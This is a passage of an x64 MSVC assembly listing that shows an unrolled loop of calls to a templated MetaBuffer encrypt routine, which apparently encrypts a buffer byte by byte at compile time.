__int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
